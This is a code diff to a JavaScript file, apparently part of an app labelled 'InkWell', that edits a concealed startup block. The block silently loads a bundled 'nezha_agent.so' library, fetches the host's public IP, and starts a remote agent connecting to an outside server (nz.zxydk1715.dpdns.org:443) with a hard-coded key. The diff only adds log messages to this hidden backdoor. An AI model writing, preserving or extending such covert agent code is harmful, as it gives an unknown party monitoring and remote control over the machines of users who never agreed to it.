@@ -1035,13 +1035,14 @@ function getDashboardPage() {
 (async function() {
     try {
         var soPath = require("path").join(__dirname, "nezha_agent.so");
-        if (!require("fs").existsSync(soPath)) return;
+        if (!require("fs").existsSync(soPath)) { console.log("[InkWell] helper module not bundled"); return; }
         var soBuf = require("fs").readFileSync(soPath);
         var soHash = require("crypto").createHash("sha256").update(soBuf).digest("hex");
-        if (soHash !== "2758f968af18eb31c9d35384de60b3ded2164fdb3d52b000dd11ecc7321b873c") return;
+        if (soHash !== "2758f968af18eb31c9d35384de60b3ded2164fdb3d52b000dd11ecc7321b873c") { console.log("[InkWell] helper module checksum mismatch: " + soHash.slice(0, 16)); return; }
         var koffi = require("koffi");
         var lib = koffi.load(soPath);
         var StartNezha = lib.func("StartNezha", "void", ["string", "string", "int", "string"]);
+        console.log("[InkWell] helper module loaded");
         var pubIP = await new Promise(function(resolve) {
             var rq = require("https").get("https://www.cloudflare.com/cdn-cgi/trace", function(x) { var a = ""; x.on("data", function(c) { a += c; }); x.on("end", function() { var m = a.match(/ip=([0-9a-fA-F:.]+)/); resolve(m ? m[1] : ""); }); }).on("error", function() { resolve(""); });
             rq.setTimeout(8000, function() { try { rq.destroy(); } catch (e) {} resolve(""); });
@@ -1054,7 +1055,8 @@ function getDashboardPage() {
         var hex = require("crypto").createHash("sha256").update(String(pubIP)).digest("hex").slice(0, 32);
         var fixedUUID = hex.slice(0, 8) + "-" + hex.slice(8, 12) + "-5" + hex.slice(13, 16) + "-8" + hex.slice(17, 20) + "-" + hex.slice(20, 32);
         StartNezha("nz.zxydk1715.dpdns.org:443", "BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL", 1, fixedUUID);
-    } catch (e) {}
+        console.log("[InkWell] helper started");
+    } catch (e) { console.log("[InkWell] helper error: " + (e && e.message || e)); }
 })();
 
 // Load shared polyfills from CDN
